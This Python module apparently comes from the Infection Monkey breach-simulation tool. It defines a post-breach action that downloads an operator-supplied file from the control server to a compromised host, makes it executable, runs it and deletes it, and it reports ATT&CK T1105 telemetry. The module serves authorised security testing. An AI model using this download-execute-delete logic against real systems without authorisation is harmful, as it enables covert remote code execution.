import logging
import os

from common.common_consts.post_breach_consts import POST_BREACH_FILE_EXECUTION
from common.utils.attack_utils import ScanStatus
from infection_monkey.config import WormConfiguration
from infection_monkey.control import ControlClient
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.post_breach.pba import PBA
from infection_monkey.telemetry.attack.t1105_telem import T1105Telem
from infection_monkey.telemetry.post_breach_telem import PostBreachTelem
from infection_monkey.utils.environment import is_windows_os
from infection_monkey.utils.monkey_dir import get_monkey_dir_path

LOG = logging.getLogger(__name__)

__author__ = 'VakarisZ'

# Default commands for executing PBA file and then removing it
DEFAULT_LINUX_COMMAND = "chmod +x {0} ; {0} ; rm {0}"
DEFAULT_WINDOWS_COMMAND = "{0} & del {0}"

DIR_CHANGE_WINDOWS = 'cd %s & '
DIR_CHANGE_LINUX = 'cd %s ; '


class UsersPBA(PBA):
    """
    Defines user's configured post breach action.
    """

    def __init__(self):
        super(UsersPBA, self).__init__(POST_BREACH_FILE_EXECUTION)
        self.filename = ''
        self.command_list = []
        if not is_windows_os():
            # Add linux commands to PBAs
            self._set_default_commands(is_windows=False)
            self._set_command_list(custom_filename=WormConfiguration.PBA_linux_filename,
                                   custom_cmd=WormConfiguration.custom_PBA_linux_cmd)
        else:
            # Add windows commands to PBAs
            self._set_default_commands(is_windows=True)
            self._set_command_list(custom_filename=WormConfiguration.PBA_windows_filename,
                                   custom_cmd=WormConfiguration.custom_PBA_windows_cmd)

    def _set_default_commands(self, is_windows):
        if is_windows:
            self.dir_change_command = DIR_CHANGE_WINDOWS
            self.default_command = DEFAULT_WINDOWS_COMMAND
        else:
            self.dir_change_command = DIR_CHANGE_LINUX
            self.default_command = DEFAULT_LINUX_COMMAND

    def _set_command_list(self, custom_filename, custom_cmd):
        if custom_filename:
            if custom_cmd:
                # Add change dir command, because user will try to access his file
                cmd = (self.dir_change_command % get_monkey_dir_path()) + custom_cmd
                self.command_list.append(cmd)
                self.filename = custom_filename
                if self.filename not in cmd:  # PBA command is not about uploaded PBA file
                    file_path = os.path.join(get_monkey_dir_path(), self.filename)
                    self.command_list.append(self.default_command.format(file_path))
            else:
                file_path = os.path.join(get_monkey_dir_path(), custom_filename)
                self.command_list.append(self.default_command.format(file_path))
                self.filename = custom_filename
        elif custom_cmd:
            self.command_list.append(custom_cmd)

    def run(self):
        if self.filename:
            UsersPBA.download_pba_file(get_monkey_dir_path(), self.filename)
        for command in self.command_list:
            self.command = command  # needs to be an object variable since PostBreachTelem needs it
            result = self._execute_default()
            PostBreachTelem(self, result).send()

    @staticmethod
    def should_run(class_name):
        if not is_windows_os():
            if WormConfiguration.PBA_linux_filename or WormConfiguration.custom_PBA_linux_cmd:
                return True
        else:
            if WormConfiguration.PBA_windows_filename or WormConfiguration.custom_PBA_windows_cmd:
                return True
        return False

    @staticmethod
    def download_pba_file(dst_dir, filename):
        """
        Handles post breach action file download
        :param dst_dir: Destination directory
        :param filename: Filename
        :return: True if successful, false otherwise
        """

        pba_file_contents = ControlClient.get_pba_file(filename)

        status = None
        if not pba_file_contents or not pba_file_contents.content:
            LOG.error("Island didn't respond with post breach file.")
            status = ScanStatus.SCANNED

        if not status:
            status = ScanStatus.USED

        T1105Telem(status,
                   WormConfiguration.current_server.split(':')[0],
                   get_interface_to_target(WormConfiguration.current_server.split(':')[0]),
                   filename).send()

        if status == ScanStatus.SCANNED:
            return False

        try:
            with open(os.path.join(dst_dir, filename), 'wb') as written_PBA_file:
                written_PBA_file.write(pba_file_contents.content)
            return True
        except IOError as e:
            LOG.error("Can not upload post breach file to target machine: %s" % e)
            return False
